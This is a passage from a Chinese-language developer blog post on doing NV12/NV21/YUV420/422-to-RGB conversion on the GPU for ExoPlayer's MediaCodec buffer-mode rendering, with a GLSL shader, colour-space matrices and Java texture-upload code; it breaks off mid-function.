            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/923245500710296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ—¶å…‰å°‘å¹´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:42:20.000Z" title="Thu Jan 08 2026 03:42:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ExoPlayeræ˜¯ä¸€æ¬¾æ‰©å±•æ€§å¾ˆå¼ºçš„æ’­æ”¾å™¨ï¼Œé€šè¿‡æ‰©å±•æˆ‘ä»¬å¯ä»¥å†…æ¥å¾ˆå¤šè§£ç æ¡†æ¶ï¼Œå¦‚ffmpegã€av1ç­‰ï¼ŒåŒæ ·ï¼Œæˆ‘ä»¬å¯ä»¥åšä¸€äº›åŠŸèƒ½å¼ºåŒ–ï¼Œå¦‚æœ€å¤§å¸§ç‡é™åˆ¶ã€Bufferæ¨¡å¼æ¸²æŸ“ç­‰ã€‚</p>
<p>å®é™…ä¸Šï¼Œåœ¨ä¹‹å‰çš„æ–‡ç« ã€Š<a href="https://juejin.cn/post/7419959206273712164" target="_blank" title="https://juejin.cn/post/7419959206273712164">ExoPlayer MediaCodecè§†é¢‘è§£ç Bufferæ¨¡å¼æ”¯æŒ</a>ã€‹æˆ‘ä»¬å®ç°äº†Bufferæ¨¡å¼ï¼Œæœ¬æ¥åœ¨å†™å®Œé‚£ç¯‡æ–‡ç« ä¹‹åï¼Œè§‰å¾—æ²¡å¿…è¦å†è¿›ä¸€æ­¥äº†ï¼Œå› ä¸ºç›®å‰è€Œè¨€ï¼ŒMediaCodecçš„Surfaceæ¨¡å¼åŸºæœ¬ä¸Šè¦†ç›–äº†å¾ˆå¤šåœºæ™¯ï¼Œå…¶æ¬¡Bufferæ¨¡å¼å½“æ—¶å¼€å‘çš„åˆè¡·æ˜¯ç‰¹æ®Šå…œåº•å’Œæµ‹è¯•ç”¨ï¼›ç„¶è€Œï¼Œåœ¨éƒ¨åˆ†å‚å•†çš„è®¾å¤‡ä¸Šï¼ŒSurfaceæ¨¡å¼è¡¨ç°å‡ºäº†ä¸ç¨³å®šï¼Œæ€»æ˜¯æ’­æ”¾å¤±è´¥ï¼Œå½“ç„¶ï¼Œç¥å¥‡çš„æ˜¯ï¼Œè¿™ä¸ªè®¾å¤‡æ­£å¥½è·‘Exo-FFmpegèƒ½å®Œå…¨è§£ç å¹¶æµç•…æ¸²æŸ“ï¼Œç„¶è€Œæµ‹è¯•åé¦ˆç”»è´¨ä¸å¤ªæ»¡æ„ï¼Œæœ‰äº›æ¨¡ç³Šï¼ŒåŸå› æ˜¯Exo-FFmpegæ¸²æŸ“çš„è§†é¢‘ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„ANativeWindowæ¸²æŸ“çš„ï¼Œè¿™ä¸ªæ¸²æŸ“é€»è¾‘å†…éƒ¨å¯èƒ½ä½¿ç”¨äº†å…¶ä»–ColorSpaceè‰²å½©çŸ©é˜µï¼Œè€Œæˆ‘ä»¬çš„èµ„æºColorSpaceæ™®éæ™®éæ˜¯COLORSPACE_BT709ã€‚</p>
<p>ç»è¿‡æ²Ÿé€šï¼Œæˆ‘ä»¬å†³å®šä½¿ç”¨Exo MediaCodec Bufferæ¨¡å¼æ¸²æŸ“ï¼Œæµ‹è¯•åé¦ˆè¿™ä¸ªæ¨¡å¼ä¹Ÿæ’­æ”¾çš„ä¸é”™ã€‚</p>
<p>æ˜¾ç„¶ï¼Œæˆ‘ä»¬éœ€è¦ç»§ç»­ä¼˜åŒ–ï¼Œæå‡æ¸²æŸ“æ•ˆç‡ï¼Œåœ¨GPUä¸Šå®ç°Nv21å’ŒNv12è½¬I420ï¼Œå¹¶ä¸”åŠ¨æ€è·å–ColorSpaceã€‚</p>
<p>åœ¨è¿™ä¹‹å‰ï¼Œä½ å¯èƒ½éœ€è¦ç®€å•äº†è§£ä¸‹è‰²å½©ç©ºé—´ï¼Œå…·ä½“è€Œè¨€å°±æ˜¯è‰²ç›¸ã€äº®åº¦ã€é¥±å’Œåº¦ç›¸å…³è‰²å½©æ¨¡å‹ã€‚</p>
<h2 data-id="heading-1">æ–¹æ¡ˆ</h2>
<p>æœ¬ç¯‡ä¼šä¼˜åŒ–æ¸²æŸ“èƒ½åŠ›ï¼Œä¸å†åƒä¹‹å‰çš„æ–‡ç« ä¸­ï¼Œé€šè¿‡CPUæ–¹å¼å®ç°å®ç°Nv21ã€NV12ã€YUV422ç­‰æ ¼å¼è½¬I420ï¼Œé‚£ä¹ˆï¼Œæ„å‘³ç€æˆ‘ä»¬éœ€è¦æŠŠåŸå§‹æ•°æ®ä¼ è¾“åˆ°GPUï¼Œå®ç°GPUä¸ŠYUVç¼–ç å¯¹é½ï¼Œå½“ç„¶ï¼Œéœ€è¦é‡æ–°è§„åˆ’Shaderè„šæœ¬ã€‚</p>
<h3 data-id="heading-2">glslè„šæœ¬å®ç°</h3>
<p>é‚£ä¹ˆï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦å‘Šè¯‰shaderï¼Œä¼ è¾“è¿›æ¥çš„æ•°æ®ç±»å‹ï¼Œè¿™é‡Œå®šä¹‰u_format_typeå˜é‡ï¼ŒåŒæ—¶è¿˜æœ‰å‘Šè¯‰shaderè‰²å½©ç©ºé—´colorFormatMatrixçŸ©é˜µï¼ˆrgb 3x3ï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java">precision highp <span class="hljs-type">float</span>;

<span class="hljs-comment">// Uniforms (ç”± Java ä»£ç ä¼ å…¥çš„æ§åˆ¶å‚æ•°)</span>
uniform <span class="hljs-type">int</span> u_format_type;      <span class="hljs-comment">// 0: Planar (I420), 1: NV12, 2: NV21</span>
uniform sampler2D s_texture_y;  <span class="hljs-comment">// çº¹ç†å•å…ƒ 0 (Y åˆ†é‡)</span>
uniform sampler2D s_texture_u;  <span class="hljs-comment">// çº¹ç†å•å…ƒ 1 (U åˆ†é‡ æˆ– UV/VU äº¤é”™åˆ†é‡)</span>
uniform sampler2D s_texture_v;  <span class="hljs-comment">// çº¹ç†å•å…ƒ 2 (V åˆ†é‡ï¼Œä»…ç”¨äº Planar æ ¼å¼)</span>

<span class="hljs-comment">// Varying (ç”± Vertex Shader ä¼ æ¥çš„æ’å€¼åçš„çº¹ç†åæ ‡)</span>
varying vec2 v_texCoord;
<span class="hljs-comment">//é¢œè‰²ç©ºé—´</span>
uniform mat3 colorFormatMatrix;

<span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. é‡‡æ · Y (äº®åº¦) åˆ†é‡</span>
    <span class="hljs-type">float</span> <span class="hljs-variable">Y</span> <span class="hljs-operator">=</span> texture2D(s_texture_y, v_texCoord).r;
    <span class="hljs-type">float</span> U, V;

    <span class="hljs-comment">// 2. æ ¹æ®æ ¼å¼ç±»å‹ u_format_type é‡‡æ · U å’Œ V åˆ†é‡</span>
    <span class="hljs-keyword">if</span> (u_format_type == <span class="hljs-number">0</span> || u_format_type == <span class="hljs-number">3</span>) {
        <span class="hljs-comment">// Planar (I420/YV12): ä»ä¸¤ä¸ªç‹¬ç«‹çš„çº¹ç†ä¸­é‡‡æ · U å’Œ V</span>
        U = texture2D(s_texture_u, v_texCoord).r;
        V = texture2D(s_texture_v, v_texCoord).r;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Semi-Planar (NV12/NV21/NV16): ä»ä¸€ä¸ªå…±äº«çº¹ç†ä¸­é‡‡æ · UV æˆ– VU</span>
        <span class="hljs-type">vec4</span> <span class="hljs-variable">uv_data</span> <span class="hljs-operator">=</span> texture2D(s_texture_u, v_texCoord); <span class="hljs-comment">// s_texture_u è¢«ç”¨äº UV/VU</span>

        <span class="hljs-keyword">if</span> (u_format_type == <span class="hljs-number">1</span>) {
            <span class="hljs-comment">// NV12 (UVUV...) -&gt; U=R, V=G</span>
            U = uv_data.r;
            V = uv_data.a;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(u_format_type == <span class="hljs-number">2</span>){
            <span class="hljs-comment">// NV21 (VUVU...) -&gt; V=R, U=G</span>
            V = uv_data.r;
            U = uv_data.a;
        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(u_format_type == <span class="hljs-number">4</span>){
            <span class="hljs-comment">// NV12 æˆ– NV16 - é€»è¾‘å®Œå…¨ä¸€æ ·ï¼</span>
            <span class="hljs-comment">// texture_u å®é™…ä¸Šå­˜çš„æ˜¯ UVUV...</span>
             U = uv_data.r;
             V = uv_data.a;
        }
    }

    <span class="hljs-comment">// 3. YUV åˆ° RGB è½¬æ¢ (BT.601 æ ‡å‡†)</span>
    <span class="hljs-comment">// ç§»é™¤æ‰€æœ‰çš„ 'f' åç¼€</span>

    <span class="hljs-comment">// è°ƒæ•´ YUV èŒƒå›´åˆ°ä¸­å¿ƒç‚¹</span>
    Y = <span class="hljs-number">1.1643</span> * (Y - <span class="hljs-number">0.0625</span>);
    U = U - <span class="hljs-number">0.5</span>;
    V = V - <span class="hljs-number">0.5</span>;

    <span class="hljs-comment">// YUV è½¬æ¢çŸ©é˜µåº”ç”¨äºè°ƒæ•´åçš„ Y, U, V (BT.601)</span>
 <span class="hljs-comment">//  float R = Y + 1.596 * V;</span>
  <span class="hljs-comment">// float G = Y - 0.391 * U - 0.813 * V;</span>
  <span class="hljs-comment">// float B = Y + 2.018 * U;</span>

   vec3 yuv;
   yuv.x = Y;
   yuv.y = U;
   yuv.z = V;

    <span class="hljs-comment">// 4. è¾“å‡ºæœ€ç»ˆé¢œè‰²</span>
   <span class="hljs-comment">// gl_FragColor = vec4(R, G, B, 1.0);</span>
    gl_FragColor = vec4(colorFormatMatrix * yuv, <span class="hljs-number">1.0</span>);
}
</code></pre>
<p>å½“ç„¶ï¼Œä¸Šé¢æåˆ°äº†è‰²å½©ç©ºé—´ï¼Œæˆ‘ä»¬åœ¨çº¹ç†ä¼ è¾“æ—¶ï¼Œä¼šæä¾›3x3çš„çŸ©é˜µ</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">float</span>[] kColorConversion601 = {
        <span class="hljs-number">1.164f</span>, <span class="hljs-number">1.164f</span>, <span class="hljs-number">1.164f</span>,
        <span class="hljs-number">0.0f</span>, -<span class="hljs-number">0.392f</span>, <span class="hljs-number">2.017f</span>,
        <span class="hljs-number">1.596f</span>, -<span class="hljs-number">0.813f</span>, <span class="hljs-number">0.0f</span>,
};

<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">float</span>[] kColorConversion709 = {
        <span class="hljs-number">1.164f</span>, <span class="hljs-number">1.164f</span>, <span class="hljs-number">1.164f</span>,
        <span class="hljs-number">0.0f</span>, -<span class="hljs-number">0.213f</span>, <span class="hljs-number">2.112f</span>,
        <span class="hljs-number">1.793f</span>, -<span class="hljs-number">0.533f</span>, <span class="hljs-number">0.0f</span>,
};

<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">float</span>[] kColorConversion2020 = {
        <span class="hljs-number">1.168f</span>, <span class="hljs-number">1.168f</span>, <span class="hljs-number">1.168f</span>,
        <span class="hljs-number">0.0f</span>, -<span class="hljs-number">0.188f</span>, <span class="hljs-number">2.148f</span>,
        <span class="hljs-number">1.683f</span>, -<span class="hljs-number">0.652f</span>, <span class="hljs-number">0.0f</span>,
};
</code></pre>
<h3 data-id="heading-3">GLYUVSurfaceViewå®ç°</h3>
<h4 data-id="heading-4">ä¼ è¾“åŸç†</h4>
<p>æœ‰äº†è„šæœ¬ï¼Œæˆ‘ä»¬åªéœ€è¦æŒ‰éƒ¨å°±ç­å®ç°GLSurfaceViewï¼Œä½†çº¹ç†ä¸Šä¼ ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ä¸‹OPEN GLä¸Šä¼ çš„æ•°æ®ç±»å‹ï¼Œå•ä¸€ç±»å‹çš„çº¹ç†ï¼Œéƒ½æ˜¯é€šè¿‡GLES20.GL_LUMINANCEå®ç°ä¸Šä¼ ï¼Œè€Œå¯¹äºUVUVæˆ–è€…UVUVäº¤é”™çš„ç±»å‹ï¼Œä½¿ç”¨GLES20.GL_LUMINANCEï¼ˆæ˜äº®åº¦ï¼Œå¯ä»¥ä½œä¸ºå•ä¸€ç±»å‹å¦‚Yã€Uã€Vã€Rã€Gã€Bä¼ è¾“ï¼‰æ˜¾ç„¶åœ¨Shaderæ— æ³•å‡†ç¡®æå–å‡ºUå’ŒVåˆ†é‡ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>å®é™…ä¸Šï¼ŒOpen GL ES æä¾›äº†ä¸€ä¸ªæ•°æ®ç±»å‹GLES20.GL_LUMINANCE_ALPHAï¼Œå’ŒGLES20.GL_LUMINANCEç›¸æ¯”GLES20.GL_LUMINANCE_ALPHAæ˜¯æ¯2ä¸ªå­—èŠ‚ä½œä¸ºä¸€ç»„ï¼Œè€Œå‰è€…æ˜¯å•ä¸€å­—èŠ‚ï¼Œå¦‚æœä½¿ç”¨GLES20.GL_LUMINANCEä¼šå‡ºç°ç½‘æ ¼ç°è±¡ï¼ˆYåˆ†ç¦»æ­£å¸¸ï¼ŒUVåˆ†é‡å¤„ç†ä¸å½“å‡ºç°ç”»é¢ç½‘æ ¼ï¼‰ï¼Œé‚£ä¹ˆGLES20.GL_LUMINANCE_ALPHAæ­£å¥½å¯ä»¥äº¤é”™å®ç°UVUVUV...æˆ–è€…VUVUVU...è¿™æ ·çš„ä¼ è¾“ï¼Œè€Œä¸”åœ¨GLä¸­èƒ½å¤Ÿç›´æ¥æå–Uåˆ†é‡å’ŒVåˆ†é‡ã€‚</p>
<h4 data-id="heading-5">å…·ä½“å®ç°</h4>
<p>ä¸‹é¢æ˜¯GLSurfaceViewæ ¸å¿ƒé€»è¾‘ï¼Œæˆ‘ä»¬ä¼šå®ç°YUV420ï¼ˆNV21ã€NV12ã€PLANARï¼‰ã€YUV422ï¼ˆäº¤é”™ã€PLANARï¼‰çš„Bufferæ•°æ®ç›´æ¥ä¼ è¾“è‡³GPUï¼Œç„¶ååœ¨GPUä¸Šè¿›è¡Œæ ¼å¼è½¬æ¢</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æ ¸å¿ƒï¼šè®¡ç®—å¸ƒå±€ã€å¤„ç† Strideï¼ˆé›¶æ‹·è´å¤±è´¥æ—¶ï¼‰å¹¶ä¸Šä¼ çº¹ç†ã€‚
 */</span>
<span class="hljs-comment">/**
 * æ ¸å¿ƒï¼šè®¡ç®—å¸ƒå±€ã€å¤„ç† Stride å¹¶ä¸Šä¼ çº¹ç†ã€‚
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadYuvTextures</span><span class="hljs-params">(ByteBuffer fullBuffer, <span class="hljs-type">int</span> format, <span class="hljs-type">int</span> width, <span class="hljs-type">int</span> height, <span class="hljs-type">int</span> stride)</span> {
    <span class="hljs-type">YuvFormat</span> <span class="hljs-variable">formatType</span> <span class="hljs-operator">=</span> getFormatType(format);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">yStride</span> <span class="hljs-operator">=</span> stride;
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">yWidth</span> <span class="hljs-operator">=</span> width;
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">yHeight</span> <span class="hljs-operator">=</span> height;

    <span class="hljs-comment">// --- 1. åŒºåˆ† 420 å’Œ 422 ---</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">is422</span> <span class="hljs-operator">=</span> (formatType == YuvFormat.PLANAR_422 || formatType == YuvFormat.NV16);

    <span class="hljs-comment">// --- 2. è®¡ç®—è‰²åº¦(Chroma)å¹³é¢çš„å°ºå¯¸ ---</span>
    <span class="hljs-comment">// å®½åº¦ï¼šæ— è®ºæ˜¯ 420 è¿˜æ˜¯ 422ï¼ŒUV å®½åº¦é€šå¸¸éƒ½æ˜¯ Y çš„ä¸€åŠ</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">cWidth</span> <span class="hljs-operator">=</span> (width + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;

    <span class="hljs-comment">// é«˜åº¦ï¼š420 æ˜¯ Y çš„ä¸€åŠï¼Œ422 ä¸ Y ç›¸åŒ</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">cHeight</span> <span class="hljs-operator">=</span> is422 ? height : (height + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;

    <span class="hljs-comment">// Strideï¼šPlanar æ¨¡å¼ä¸‹é€šå¸¸æ˜¯ Y stride çš„ä¸€åŠ</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">cStride</span> <span class="hljs-operator">=</span> stride / <span class="hljs-number">2</span>;

    <span class="hljs-type">int</span> uOffset, vOffset;

    <span class="hljs-comment">// --- 3. æ ¹æ®æ ¼å¼è®¡ç®—åç§»é‡ ---</span>
    <span class="hljs-keyword">switch</span> (formatType) {
        <span class="hljs-keyword">case</span> PLANAR:
        <span class="hljs-keyword">case</span> PLANAR_422: <span class="hljs-comment">// é€»è¾‘ç›¸åŒï¼Œåªæ˜¯ cHeight å˜äº†</span>
            uOffset = yStride * height;
            vOffset = uOffset + cStride * cHeight;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> NV12:
        <span class="hljs-keyword">case</span> NV16: <span class="hljs-comment">// é€»è¾‘ç›¸åŒï¼ŒNV16 çš„ UV å¹³é¢é«˜åº¦æ˜¯ NV12 çš„ä¸¤å€</span>
            uOffset = yStride * height;
            vOffset = -<span class="hljs-number">1</span>; <span class="hljs-comment">// ä¸ä½¿ç”¨</span>
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> NV21:
            vOffset = yStride * height;
            uOffset = -<span class="hljs-number">1</span>; <span class="hljs-comment">// ä¸ä½¿ç”¨</span>
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:
            <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// --- 4. ä¸Šä¼  Y çº¹ç† (Texture Unit 0) ---</span>
    fullBuffer.position(<span class="hljs-number">0</span>);
    GLES20.glActiveTexture(GLES20.GL_TEXTURE0);
    GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureIds[<span class="hljs-number">0</span>]);
    uploadPlane(fullBuffer, yStride, yWidth, yHeight, GLES20.GL_LUMINANCE);

    <span class="hljs-keyword">try</span> {
        GlUtil.checkGlError();
    } <span class="hljs-keyword">catch</span> (GlUtil.GlException e) {
        <span class="hljs-comment">// é”™è¯¯å¤„ç†...</span>
    }

    <span class="hljs-comment">// --- 5. ä¸Šä¼  U/V æˆ– UV çº¹ç† ---</span>
    <span class="hljs-keyword">if</span> (formatType == YuvFormat.PLANAR || formatType == YuvFormat.PLANAR_422) {
        <span class="hljs-comment">// Planar: U (T1) å’Œ V (T2) åˆ†å¼€</span>

        <span class="hljs-comment">// ä¸Šä¼  U</span>
        fullBuffer.position(uOffset);
        GLES20.glActiveTexture(GLES20.GL_TEXTURE1);
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureIds[<span class="hljs-number">1</span>]);
        uploadPlane(fullBuffer, cStride, cWidth, cHeight, GLES20.GL_LUMINANCE);

        <span class="hljs-comment">// ä¸Šä¼  V</span>
        fullBuffer.position(vOffset);
        GLES20.glActiveTexture(GLES20.GL_TEXTURE2);
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureIds[<span class="hljs-number">2</span>]);
        uploadPlane(fullBuffer, cStride, cWidth, cHeight, GLES20.GL_LUMINANCE);

    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Semi-Planar (NV12/NV21/NV16): UV äº¤é”™ (T1)</span>

        <span class="hljs-comment">// å¯¹äº NV12/NV16ï¼ŒUV æ•°æ®äº¤é”™å­˜æ”¾ï¼Œå®½åº¦çœ‹ä¼¼æ˜¯ cWidthï¼Œä½†æ¯ä¸ªåƒç´ æœ‰2ä¸ªå­—èŠ‚(Uå’ŒV)</span>
        <span class="hljs-comment">// åœ¨ GL_LUMINANCE_ALPHA æ ¼å¼ä¸‹ï¼Œçº¹ç†å®½åº¦ = cWidthï¼Œçº¹ç†é«˜åº¦ = cHeight</span>
        <span class="hljs-comment">// å†…å­˜ä¸­çš„è¡Œå®½ (Stride) é€šå¸¸ç­‰äº Y çš„ Stride</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">uvStride</span> <span class="hljs-operator">=</span> yStride;
        <span class="hljs-type">int</span> <span class="hljs-variable">uvPlaneWidth</span> <span class="hljs-operator">=</span> cWidth;

        <span class="hljs-type">int</span> <span class="hljs-variable">uvOffset</span> <span class="hljs-operator">=</span> (formatType == YuvFormat.NV12 || formatType == YuvFormat.NV16) ? uOffset : vOffset;
        fullBuffer.position(uvOffset);

        GLES20.glActiveTexture(GLES20.GL_TEXTURE1);
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureIds[<span class="hljs-number">1</span>]);

        <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨ GL_LUMINANCE_ALPHAï¼Œä¸€ä¸ªçº¹ç†åƒç´ åŒ…å« (Luminance, Alpha) å³ (U, V)</span>
        uploadPlane(fullBuffer, uvStride, uvPlaneWidth, cHeight, GLES20.GL_LUMINANCE_ALPHA);

        <span class="hljs-comment">// ç¦ç”¨ç¬¬ä¸‰ä¸ªçº¹ç†å•å…ƒ</span>
        GLES20.glActiveTexture(GLES20.GL_TEXTURE2);
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, <span class="hljs-number">0</span>);
    }

    currentFormat = formatType;
}
</code></pre>
<p>å½“ç„¶ï¼ŒuploadPlaneçš„æºç åŒæ ·é‡è¦ï¼Œæ­¤éƒ¨ä»½å†³å®šç”»é¢æ˜¯å¦ä¼šå€¾æ–œã€é»‘å±ã€æˆ–è€…èŠ±å±ï¼Œä¸‹é¢æ˜¯å®Œæ•´æºç ï¼Œä¸è¿‡åœ¨å®é™…çš„å®ç°ä¸­ï¼Œæˆ‘ä»¬è¦è€ƒè™‘planeStrideå¤§äºæ•°æ®è¡Œçš„é—®é¢˜ï¼Œå¯¹ç©ºè¡Œæ•°æ®è¿›è¡Œå¡«å……ï¼Œé˜²æ­¢é”™ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ã€å…³é”®å‡½æ•°ã€‘è¾…åŠ©å‡½æ•°ï¼šä¸Šä¼ å•ä¸ªå¹³é¢çº¹ç†ï¼Œæ”¯æŒ GLES 3.0 é›¶æ‹·è´å’Œ GLES 2.0 å›é€€ã€‚
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadPlane</span><span class="hljs-params">(ByteBuffer buffer, <span class="hljs-type">int</span> planeStride, <span class="hljs-type">int</span> planeWidth, <span class="hljs-type">int</span> planeHeight, <span class="hljs-type">int</span> glFormat)</span> {
    GLES20.glPixelStorei(GLES20.GL_UNPACK_ALIGNMENT, <span class="hljs-number">1</span>);
    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">localBuffer</span> <span class="hljs-operator">=</span> buffer.duplicate();
    <span class="hljs-type">int</span> <span class="hljs-variable">bytesPerPixel</span> <span class="hljs-operator">=</span> (glFormat == GLES20.GL_LUMINANCE_ALPHA) ? <span class="hljs-number">2</span> : <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">actualDataBytesPerRow</span> <span class="hljs-operator">=</span> planeWidth * bytesPerPixel;

    <span class="hljs-keyword">if</span> (planeStride &gt; actualDataBytesPerRow) {
        <span class="hljs-keyword">if</span> (glVersion &gt;= <span class="hljs-number">3</span>) {
            GLES30.glPixelStorei(GLES30.GL_UNPACK_ROW_LENGTH, planeStride);

            GLES20.glTexImage2D(
                    GLES20.GL_TEXTURE_2D, <span class="hljs-number">0</span>, glFormat,
                    planeWidth, planeHeight, <span class="hljs-number">0</span>,
